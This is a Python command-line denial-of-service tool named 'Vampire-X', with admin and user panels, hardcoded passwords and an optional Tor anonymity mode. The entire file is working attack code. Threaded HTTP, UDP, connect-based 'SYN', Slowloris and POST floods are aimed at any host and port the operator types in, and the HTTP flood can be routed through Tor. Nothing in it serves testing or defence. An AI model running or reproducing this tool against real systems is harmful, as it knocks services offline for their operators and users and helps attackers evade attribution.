#!/usr/bin/env python3

import os
import sys
import time
import socket
import threading
import subprocess
import random

try:
    import socks
    from colorama import Fore, Style, init
except ImportError:
    print("[*] Missing modules detected. Installing...")
    subprocess.call([sys.executable, "-m", "pip", "install", "pysocks", "colorama"])
    import socks
    from colorama import Fore, Style, init

init(autoreset=True)

# Credentials
ADMIN_PASSWORD = "SH404"
TOR_PASSWORD = "SH404"

# Banners
def admin_banner():
    print(Fore.RED + Style.BRIGHT + r"""
██╗░░░██╗███████╗██████╗░██╗░░░██╗
██║░░░██║██╔════╝██╔══██╗██║░░░██║
██║░░░██║█████╗░░██████╔╝██║░░░██║
██║░░░██║██╔══╝░░██╔═══╝░██║░░░██║
╚██████╔╝███████╗██║░░░░░╚██████╔╝
░╚═════╝░╚══════╝╚═╝░░░░░░╚═════╝░
       Vampire-X Admin Panel
""" + Style.RESET_ALL)

def user_banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
██    ██ ██████  ██████  ██    ██ ██ 
██████  ███████     ██ ██    ██ ██ 
██   ██ ██   ██ ██    ██ ██ ██   ██ 
██          ██ ██    ██ ██████  ██████ 
██    ██ ██      ██      ██ ██   ██ ██ 
██████  ██ ██████  ███████     ██
       Vampire-X User Panel
""" + Style.RESET_ALL)

# TOR Setup
def setup_tor():
    print(Fore.YELLOW + "[*] Checking for TOR...")
    result = subprocess.run(['which', 'tor'], stdout=subprocess.DEVNULL)
    if result.returncode != 0:
        print(Fore.YELLOW + "[+] TOR not found. Installing...")
        os.system("pkg install tor -y")
    else:
        print(Fore.GREEN + "[✓] TOR already installed.")

    torrc_path = os.path.expanduser("~/.torrc")
    if not os.path.exists(torrc_path):
        with open(torrc_path, 'w') as f:
            f.write("SOCKSPort 9050\n")

    print(Fore.YELLOW + "[*] Starting TOR...")
    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(6)
    print(Fore.GREEN + "[✓] TOR routing enabled.")

# Attack Types
def http_flood(target, port, use_tor):
    def ddos():
        try:
            s = socks.socksocket()
            if use_tor:
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.connect((target, port))
            while True:
                ua = f"User-Agent: Dracula-{random.randint(1000,9999)}"
                req = f"GET / HTTP/1.1\r\nHost: {target}\r\n{ua}\r\n\r\n"
                s.send(req.encode())
        except:
            pass

    for _ in range(threads):
        threading.Thread(target=ddos).start()

def udp_flood(target, port):
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        while True:
            s.sendto(payload, (target, port))

    for _ in range(threads):
        threading.Thread(target=flood).start()

def syn_flood(target, port):
    def flood():
        s = socket.socket()
        while True:
            try:
                s.connect((target, port))
            except:
                pass

    for _ in range(threads):
        threading.Thread(target=flood).start()

def slowloris(target, port):
    def attack():
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n")
            while True:
                s.send(b"X-a: b\r\n")
                time.sleep(15)
        except:
            pass

    for _ in range(threads):
        threading.Thread(target=attack).start()

def post_flood(target, port):
    def attack():
        try:
            s = socket.socket()
            s.connect((target, port))
            data = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 1000\r\n\r\n"
            s.send(data.encode())
        except:
            pass

    for _ in range(threads):
        threading.Thread(target=attack).start()

# Main App
def main():
    os.system("clear")
    mode = input(Fore.MAGENTA + "[?] Enter Mode (admin/user): ").strip().lower()

    if mode == "admin":
        passwd = input(Fore.YELLOW + "[!] Admin Password: ")
        if passwd != ADMIN_PASSWORD:
            print(Fore.RED + "[X] Incorrect password!")
            sys.exit()
        admin_banner()
    elif mode == "user":
        user_banner()
    else:
        print(Fore.RED + "[X] Invalid mode selected!")
        return

    anon = input(Fore.MAGENTA + "[?] Enable Anonymous Mode (TOR)? (y/n): ").strip().lower()
    use_tor = False

    if anon == 'y':
        tor_pass = input(Fore.YELLOW + "[!] Enter TOR password: ")
        if tor_pass == TOR_PASSWORD:
            setup_tor()
            use_tor = True
        else:
            print(Fore.RED + "[X] Wrong TOR password!")
            return

    try:
        global threads
        target = input(Fore.CYAN + "[+] Target IP/Host: ").strip()
        port = int(input("[+] Target Port: "))
        threads = int(input("[+] Threads Count: "))

        print(Fore.MAGENTA + "[?] Select Attack Type:")
        print("1. HTTP Flood")
        print("2. UDP Flood")
        print("3. SYN Flood")
        print("4. Slowloris")
        print("5. POST Flood")
        choice = input(Fore.YELLOW + "[+] Choice: ")

        attack_funcs = {
            "1": http_flood,
            "2": udp_flood,
            "3": syn_flood,
            "4": slowloris,
            "5": post_flood
        }

        if choice in attack_funcs:
            if choice == "1":
                attack_funcs[choice](target, port, use_tor)
            else:
                attack_funcs[choice](target, port)
            print(Fore.GREEN + f"[✓] Attack started on {target}:{port} using mode {choice} with {threads} threads.")
        else:
            print(Fore.RED + "[X] Invalid attack type!")

    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        subprocess.call([sys.executable, "-m", "pip", "install", "pysocks", "colorama"])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted by user. Exiting...")
